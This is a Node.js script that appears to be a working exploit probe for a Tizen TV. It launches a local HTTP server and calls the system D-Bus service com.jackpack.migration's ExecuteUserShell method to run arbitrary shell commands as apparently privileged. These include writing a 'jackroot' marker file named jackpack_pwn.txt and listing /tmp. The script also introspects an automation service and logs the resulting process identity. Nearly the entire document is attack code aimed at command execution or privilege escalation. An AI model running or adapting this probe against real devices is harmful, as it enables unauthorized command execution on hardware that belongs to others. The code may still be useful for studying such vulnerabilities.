'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8155;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe67h.txt';
var SHARE_PWN = '/home/owner/share/tmp/sdk_tools/jackpack_pwn.txt';

var INNER = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var result = {};',

  // 1. Introspect jackpack.migration to see real method signatures
  'try {',
  '  var r = cp.execSync(',
  '    "dbus-send --system --dest=com.jackpack.migration --type=method_call --print-reply /com/jackpack/migration org.freedesktop.DBus.Introspectable.Introspect 2>&1",',
  '    {timeout:5000}',
  '  );',
  '  result.jackpack_introspect = r.toString().trim();',
  '} catch(e) { result.jackpack_introspect_err = e.message.slice(0,200); }',

  // 2. Probe: non-existent binary (should fail if really executing)
  'try {',
  '  var r2 = cp.spawnSync("dbus-send", [',
  '    "--system",',
  '    "--dest=com.jackpack.migration",',
  '    "--type=method_call",',
  '    "--print-reply",',
  '    "/com/jackpack/migration",',
  '    "com.jackpack.migration.ExecuteUserShell",',
  '    "string:/NONEXISTENT_BINARY_xyzabc"',
  '  ], {timeout:5000});',
  '  result.nonexistent = {',
  '    out: r2.stdout ? r2.stdout.toString().trim() : "",',
  '    status: r2.status',
  '  };',
  '} catch(e) { result.nonexistent_err = e.message; }',

  // 3. Try writing to our writable share path
  'var write_cmds = [',
  '  "/bin/sh -c \'echo jackroot > /home/owner/share/tmp/sdk_tools/jackpack_pwn.txt\'"',
  '];',
  'result.share_write = {};',
  'write_cmds.forEach(function(cmd) {',
  '  try {',
  '    var r3 = cp.spawnSync("dbus-send", [',
  '      "--system",',
  '      "--dest=com.jackpack.migration",',
  '      "--type=method_call",',
  '      "--print-reply",',
  '      "/com/jackpack/migration",',
  '      "com.jackpack.migration.ExecuteUserShell",',
  '      "string:" + cmd',
  '    ], {timeout:6000});',
  '    result.share_write[cmd] = {',
  '      out: r3.stdout ? r3.stdout.toString().trim() : "",',
  '      status: r3.status',
  '    };',
  '  } catch(e) {',
  '    result.share_write[cmd + "_ex"] = e.message;',
  '  }',
  '});',

  // 4. Check if file was created
  'try {',
  '  result.share_pwn_content = fs.readFileSync("' + SHARE_PWN + '", "utf8").trim();',
  '} catch(e) { result.share_pwn_err = e.message; }',

  // 5. List /tmp contents via jackpack (using shell ls)
  'try {',
  '  var r4 = cp.spawnSync("dbus-send", [',
  '    "--system",',
  '    "--dest=com.jackpack.migration",',
  '    "--type=method_call",',
  '    "--print-reply",',
  '    "/com/jackpack/migration",',
  '    "com.jackpack.migration.ExecuteUserShell",',
  '    "string:/bin/ls -la /tmp"',
  '  ], {timeout:5000});',
  '  result.ls_tmp = {',
  '    out: r4.stdout ? r4.stdout.toString().trim() : "",',
  '    status: r4.status',
  '  };',
  '} catch(e) { result.ls_tmp_err = e.message; }',

  // 6. Try direct system() format via two-string variant (data0 + data1)
  // Try ExecuteCommandWithData on automation-service  
  'try {',
  '  var r5 = cp.spawnSync("dbus-send", [',
  '    "--system",',
  '    "--dest=org.tizen.tv.automation-service",',
  '    "--type=method_call",',
  '    "--print-reply",',
  '    "/TIFacAutoObj",',
  '    "org.freedesktop.DBus.Introspectable.Introspect"',
  '  ], {timeout:5000});',
  '  result.automation_introspect = r5.stdout ? r5.stdout.toString() : "";',
  '  result.automation_introspect_err = r5.stderr ? r5.stderr.toString() : "";',
  '} catch(e) { result.automation_introspect_ex = e.message; }',

  // 7. Our own id
  'try {',
  '  result.our_id = cp.execSync("/usr/bin/id 2>&1", {timeout:3000}).toString().trim();',
  '} catch(e) { result.our_id_err = e.message; }',

  'var out = JSON.stringify(result, null, 2);',
  'try { require("fs").writeFileSync("' + PROBE_FILE + '", out); } catch(e) {}',
  'process.stdout.write(out);'
].join('\n');

function runProbe(cb) {
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 90000 }, function(err, stdout, stderr) {
    var result;
    if (err) {
      result = JSON.stringify({ exec_error: err.message.slice(0, 200), stderr: (stderr || '').slice(0, 300), stdout: stdout || '' });
    } else {
      result = stdout || '{}';
    }
    cb(result);
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(result) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(result);
  });
});

server.listen(PORT, '127.0.0.1', function() {
  runProbe(function(result) {
    try { fs.writeFileSync(PROBE_FILE, result); } catch(e) {}
  });
});

server.on('error', function(e) {
  try { fs.writeFileSync(PROBE_FILE, JSON.stringify({ server_err: e.message })); } catch(e2) {}
});

setInterval(function() {}, 60000);
